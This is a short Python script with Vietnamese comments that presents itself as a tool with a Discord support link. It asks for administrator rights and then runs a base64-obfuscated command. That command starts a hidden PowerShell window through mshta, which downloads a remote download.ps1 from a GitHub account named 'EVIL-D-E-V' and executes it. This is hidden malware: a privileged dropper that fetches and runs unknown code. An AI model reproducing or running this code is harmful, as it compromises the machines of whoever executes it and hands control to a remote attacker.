content = """
================================
discord:https://dsc.gg/ursenic
github:https://github.com/ursenic
================================
Vui long vô discord để được hỗ trợ nha
"""

with open("info.txt", "w", encoding="utf-8") as file:
    file.write(content)

import os
import sys
import ctypes

def is_admin():
    """Kiểm tra xem script có đang chạy với quyền admin không."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def restart_as_admin():
    """Khởi động lại script với quyền admin."""
    if not is_admin():
        print("Không có quyền admin, khởi động lại với quyền admin...")
        # Lấy đường dẫn đến script hiện tại
        script = os.path.abspath(__file__)
        # Lệnh để chạy script với quyền admin
        params = f'"{script}"'
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit()

# Kiểm tra quyền admin
restart_as_admin()

__import__('os').system(__import__('base64').b64decode(b"bXNodGEgdmJzY3JpcHQ6Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuKCJwb3dlcnNoZWxsIC1jb21tYW5kICIiaXdyKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRVZJTC1ELUUtVi9NL3JlZnMvaGVhZHMvbWFpbi9kb3dubG9hZC5wczEnKSB8IGlleCIiIiwwKSh3aW5kb3cuY2xvc2Up"))
